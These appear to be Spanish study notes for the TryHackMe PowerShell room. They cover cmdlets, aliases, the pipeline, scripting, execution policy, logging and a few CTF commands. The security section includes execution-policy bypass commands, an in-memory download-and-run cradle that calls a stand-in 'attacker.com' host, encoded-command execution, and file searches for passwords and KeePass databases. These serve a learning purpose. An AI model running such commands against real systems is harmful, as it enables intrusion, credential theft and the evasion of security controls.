# Windows PowerShell — TryHackMe

> Room de la ruta Cyber Security 101

---

## Tabla de contenidos

1. [Introducción](#1-introducción)
2. [Cmdlets básicos](#2-cmdlets-básicos)
3. [Alias](#3-alias)
4. [Pipeline y operadores de comparación](#4-pipeline-y-operadores-de-comparación)
5. [Scripting](#5-scripting)
6. [Seguridad](#6-seguridad)

---

## 1. Introducción

PowerShell es una **shell de línea de comandos y lenguaje de scripting** de Microsoft. A diferencia de CMD, trabaja con **objetos .NET** en lugar de texto plano.

- **Windows PowerShell 5.1** — incluido en Windows, solo Windows
- **PowerShell Core 7+** — open source, multiplataforma (Windows, Linux, macOS)

### Estructura de un cmdlet

Todos los cmdlets siguen el patrón **`Verbo-Nombre`**:

| Verbo | Uso |
|-------|-----|
| `Get` | Obtener / recuperar información |
| `Set` | Modificar configuración o valores |
| `New` | Crear objetos nuevos |
| `Remove` | Eliminar objetos |
| `Start` / `Stop` | Iniciar o detener procesos/servicios |
| `Invoke` | Ejecutar un comando o script |
| `Test` | Comprobar conectividad, rutas… |
| `Write` | Enviar salida a consola o pipeline |

### Sistema de ayuda

```powershell
Get-Help <cmdlet>             # documentación básica
Get-Help <cmdlet> -Examples   # ejemplos de uso
Get-Help <cmdlet> -Full       # documentación completa
Get-Help <cmdlet> -Online     # abre docs.microsoft.com
Update-Help                   # actualiza la ayuda (requiere admin)
```

### Descubrir cmdlets con Get-Command

```powershell
Get-Command                        # lista todos los cmdlets disponibles
Get-Command -Name Remove*          # cmdlets que empiezan por "Remove"
Get-Command -Verb Get              # solo cmdlets con el verbo "Get"
Get-Command -Noun Process          # cmdlets que operan sobre "Process"
Get-Command -CommandType Cmdlet    # solo cmdlets nativos (excluye funciones y alias)
Get-Command -Module <módulo>       # cmdlets de un módulo específico
```

> **THM:** "How would you retrieve a list of commands that start with the verb Remove?" → `Get-Command -Name Remove*`

---

## 2. Cmdlets básicos

### Sistema de archivos

```powershell
Get-ChildItem                      # listar archivos y carpetas (ls / dir)
Get-ChildItem -Recurse             # recursivo, incluye subcarpetas
Get-ChildItem -File                # solo archivos
Get-ChildItem -Filter *.txt        # filtrar por extensión
Get-ChildItem -Hidden              # incluye archivos ocultos
Set-Location <ruta>                # cambiar directorio (cd)
Get-Location                       # directorio actual (pwd)
Get-Content <archivo>              # leer contenido (cat / type)
New-Item -ItemType File            # crear archivo
New-Item -ItemType Directory       # crear carpeta
Remove-Item <ruta>                 # eliminar archivo o carpeta
Remove-Item -Recurse               # eliminar carpeta y su contenido
Copy-Item <origen> <destino>       # copiar
Move-Item <origen> <destino>       # mover o renombrar
Select-String -Pattern "texto"     # buscar texto en archivos (grep)
```

### Procesos y servicios

```powershell
Get-Process                        # listar procesos (ps / tasklist)
Get-Process -Name chrome           # filtrar por nombre
Stop-Process -Name notepad         # terminar por nombre (kill)
Stop-Process -Id 1234              # terminar por PID
Start-Process notepad              # iniciar proceso
Get-Service                        # listar servicios
Get-Service -Name wuauserv         # estado de un servicio
Start-Service <nombre>             # iniciar servicio (requiere admin)
Stop-Service <nombre>              # detener servicio (requiere admin)
Restart-Service <nombre>           # reiniciar servicio
```

### Red

```powershell
Test-NetConnection <host>          # ping + info de ruta
Test-NetConnection -Port 80        # comprobar si un puerto está abierto
Get-NetIPAddress                   # configuración IP (ipconfig)
Resolve-DnsName <dominio>          # consulta DNS (nslookup)
Get-NetTCPConnection               # conexiones TCP activas (netstat)
Invoke-WebRequest -Uri <url>       # petición HTTP (curl / wget)
```

### Sistema y usuarios

```powershell
Get-ComputerInfo                   # información detallada del sistema
Get-LocalUser                      # usuarios locales
Get-LocalGroup                     # grupos locales
Get-LocalGroupMember               # miembros de un grupo
whoami                             # usuario y dominio actuales
Get-WinEvent -LogName System       # Event Logs del sistema
```

---

## 3. Alias

Un alias es un **nombre alternativo para un cmdlet**. Son atajos, pero los parámetros siguen siendo los de PowerShell.

### Gestionar alias

```powershell
Get-Alias                                      # listar todos los alias
Get-Alias ls                                   # ver a qué cmdlet apunta "ls"
Get-Alias -Definition Get-ChildItem            # alias que apuntan a un cmdlet
New-Alias -Name ll -Value Get-ChildItem        # crear alias (solo sesión actual)
Set-Alias -Name ll -Value Get-ChildItem        # crear o modificar alias
Remove-Item Alias:ll                           # eliminar alias
```

> Los alias creados con `New-Alias` solo duran en la sesión actual. Para hacerlos permanentes, añadirlos al fichero `$PROFILE`.

### Tabla de alias principales

| Alias | Cmdlet completo | Origen |
|-------|----------------|--------|
| `ls` / `dir` / `gci` | `Get-ChildItem` | bash / CMD |
| `cd` / `sl` / `chdir` | `Set-Location` | bash / CMD |
| `pwd` / `gl` | `Get-Location` | bash |
| `cat` / `type` / `gc` | `Get-Content` | bash / CMD |
| `cp` / `copy` / `cpi` | `Copy-Item` | bash / CMD |
| `mv` / `move` / `mi` | `Move-Item` | bash / CMD |
| `rm` / `del` / `erase` / `ri` | `Remove-Item` | bash / CMD |
| `mkdir` / `md` | `New-Item -ItemType Directory` | bash / CMD |
| `ps` / `gps` | `Get-Process` | bash |
| `kill` / `spps` | `Stop-Process` | bash |
| `echo` / `write` | `Write-Output` | bash / CMD |
| `cls` / `clear` | `Clear-Host` | CMD / bash |
| `man` / `help` | `Get-Help` | bash |
| `where` / `?` | `Where-Object` | PS |
| `%` / `foreach` | `ForEach-Object` | PS |
| `sort` | `Sort-Object` | CMD |
| `measure` | `Measure-Object` | PS |
| `select` | `Select-Object` | PS |
| `ft` | `Format-Table` | PS |
| `fl` | `Format-List` | PS |
| `gm` | `Get-Member` | PS |
| `iwr` / `curl` / `wget` | `Invoke-WebRequest` | bash |
| `iex` | `Invoke-Expression` | PS |
| `gcm` | `Get-Command` | PS |
| `gv` | `Get-Variable` | PS |

> **THM:** "What cmdlet has its traditional counterpart `echo` as an alias?" → `Write-Output`

---

## 4. Pipeline y operadores de comparación

El operador `|` pasa el **objeto completo** (no texto) de un cmdlet al siguiente.

### Cmdlets del pipeline

```powershell
Where-Object { condición }         # filtrar objetos (alias: where, ?)
Select-Object Prop1, Prop2         # seleccionar propiedades (alias: select)
Sort-Object Propiedad              # ordenar (añadir -Descending para invertir)
Select-Object -First N             # primeros N objetos
Select-Object -Last N              # últimos N objetos
Measure-Object                     # contar, sumar, promediar (alias: measure)
Get-Member                         # ver propiedades y métodos del objeto (alias: gm)
Format-Table                       # salida en tabla (alias: ft)
Format-List                        # salida en lista (alias: fl)
Out-File <ruta>                    # guardar salida en archivo
Export-Csv <ruta>                  # exportar como CSV
```

### Operadores de comparación

Se usan dentro de `Where-Object { $_.Propiedad operador valor }`:

| Operador | Nombre | Comportamiento |
|----------|--------|----------------|
| `-eq` | equal | Igual a. Devuelve coincidencias exactas. |
| `-ne` | not equal | No igual. Permite **excluir** objetos de los resultados. |
| `-gt` | greater than | Mayor que. **Estricto**: excluye objetos con valor igual al umbral. |
| `-ge` | greater than or equal to | Mayor o igual. **No estricto**: combina `-gt` y `-eq`. |
| `-lt` | less than | Menor que. **Estricto**: excluye objetos con valor igual al umbral. |
| `-le` | less than or equal to | Menor o igual. **No estricto**: combina `-lt` y `-eq`. |
| `-like` | like (wildcard) | Comodín con `*` (cualquier cadena) y `?` (un carácter). |
| `-match` | match (regex) | Expresión regular. Más potente que `-like`. |
| `-contains` | contains | Comprueba si una colección contiene un elemento. |

> **Clave:** `-gt` y `-lt` son **estrictos** (excluyen el valor igual). `-ge` y `-le` son **no estrictos** (incluyen el valor igual). `-ne` sirve para excluir resultados.

### Ejemplos

```powershell
# Procesos con más de 100MB de RAM, de mayor a menor
Get-Process | Where-Object { $_.WorkingSet -gt 100MB } | Sort-Object WorkingSet -Descending

# Los 5 procesos que más CPU consumen
Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, Id, CPU

# Servicios que NO están en estado Running
Get-Service | Where-Object { $_.Status -ne "Running" }

# Procesos con PID mayor o igual a 1000
Get-Process | Where-Object { $_.Id -ge 1000 }

# Contar archivos .log en C:\Windows
Get-ChildItem C:\Windows -Filter *.log | Measure-Object

# Exportar lista de procesos a CSV
Get-Process | Select-Object Name, Id, CPU | Export-Csv procesos.csv -NoTypeInformation

# Ver propiedades disponibles de un objeto
Get-Process | Get-Member
```

---

## 5. Scripting

### Variables

```powershell
$nombre   = "Fede"
$numero   = 42
$booleano = $true          # o $false

# Almacenar resultado de cmdlet
$procesos = Get-Process

# Array
$colores = @("rojo", "verde", "azul")
$colores[0]                # → "rojo"

# Hashtable (clave-valor)
$config = @{ host = "192.168.1.1"; puerto = 22 }
$config.host               # → "192.168.1.1"

# Variables especiales
$_             # objeto actual en el pipeline
$?             # $true si el último comando fue OK
$Error         # array con los errores recientes
$PSVersionTable.PSVersion  # versión de PowerShell
```

### Condicionales

```powershell
if ($x -gt 10) {
    Write-Output "Mayor que 10"
} elseif ($x -eq 10) {
    Write-Output "Exactamente 10"
} else {
    Write-Output "Menor que 10"
}

# Switch
switch ($color) {
    "rojo"  { Write-Output "Rojo" }
    "verde" { Write-Output "Verde" }
    default { Write-Output "Otro" }
}

# Operadores lógicos
-and  -or  -not  -xor
($x -gt 5) -and ($x -lt 20)
```

### Bucles

```powershell
# foreach
foreach ($item in $colores) { Write-Output $item }

# ForEach-Object en pipeline (alias: %)
Get-Process | ForEach-Object { Write-Output $_.Name }
Get-Process | % { $_.Name }

# for clásico
for ($i = 0; $i -lt 5; $i++) { Write-Output $i }

# while
while ($i -lt 10) { $i++ }

# do-while (siempre ejecuta al menos 1 vez)
do { $i++ } while ($i -lt 10)
```

### Funciones

```powershell
function Di-Hola {
    param($nombre)
    Write-Output "Hola, $nombre"
}
Di-Hola -nombre "Fede"

# Con parámetros tipados y valor por defecto
function Suma {
    param(
        [int]$a,
        [int]$b = 0
    )
    return $a + $b
}
Suma -a 5 -b 3    # → 8
```

### Salida y scripts

```powershell
.\script.ps1          # ejecutar script (siempre con .\ explícito)
Write-Output "texto"  # envía al pipeline (se puede capturar en variable)
Write-Host "texto"    # escribe directo en pantalla, no al pipeline
Write-Error "error"   # stream de errores
Write-Verbose "info"  # visible solo con -Verbose
```

> `Write-Output` va al pipeline y se puede capturar. `Write-Host` va directo a pantalla y no se puede capturar — solo para mensajes al usuario.

---

## 6. Seguridad

### Execution Policy

Controla qué scripts pueden ejecutarse. **No es un sandbox real** — se puede bypassear fácilmente.

```powershell
Get-ExecutionPolicy                            # política activa
Get-ExecutionPolicy -List                      # política por scope
Set-ExecutionPolicy RemoteSigned               # recomendado para desarrollo (admin)
Set-ExecutionPolicy -Scope CurrentUser         # solo para el usuario actual
```

| Política | Comportamiento | Riesgo |
|----------|---------------|--------|
| `Restricted` | Ningún script. Solo comandos interactivos. **Default en Windows.** | Bajo |
| `AllSigned` | Solo scripts firmados digitalmente. | Bajo |
| `RemoteSigned` | Scripts locales OK. Scripts de internet necesitan firma. | Medio |
| `Unrestricted` | Ejecuta todo, pide confirmación para scripts de internet. | Alto |
| `Bypass` | Sin restricciones ni advertencias. | Muy alto |

### Bypass de Execution Policy

```powershell
# Desde CMD / fuera de PS
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Solo para el proceso actual (no persiste)
Set-ExecutionPolicy Bypass -Scope Process -Force

# Ejecutar script remoto sin guardarlo en disco
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")

# Comando codificado en Base64
powershell.exe -EncodedCommand JABjAG0AZAA9AC...==
```

### Logging y artefactos forenses

| Mecanismo | Descripción | Event ID |
|-----------|-------------|----------|
| **ScriptBlock Logging** | Registra el código completo de cada bloque ejecutado, incluso ofuscado o via `IEX`. | 4104 |
| **Module Logging** | Registra ejecución de cmdlets y funciones de módulos. | 4103 |
| **Transcription** | Graba la sesión completa (inputs y outputs) en un archivo de texto. | — |
| **AMSI** | Pasa el código a Windows Defender antes de ejecutarlo. | — |

```powershell
# Ver logs de PowerShell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
Get-WinEvent -LogName "Windows PowerShell"

# Historial de la sesión actual
Get-History
```

**Historial persistente:**
```
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Guarda los últimos 4096 comandos entre sesiones. Artefacto forense clave.

### Comandos útiles para CTF

```powershell
# Descargar archivo
Invoke-WebRequest -Uri "http://..." -OutFile archivo.exe

# Buscar "password" en archivos .txt (grep)
Select-String -Path *.txt -Pattern "password"

# Leer flag
Get-Content flag.txt

# Buscar archivo por extensión en todo el sistema
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue

# Conexiones de red activas
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }

# Enumerar usuarios locales
Get-LocalUser | Select-Object Name, Enabled, LastLogon

# Versión de PowerShell
$PSVersionTable.PSVersion
```
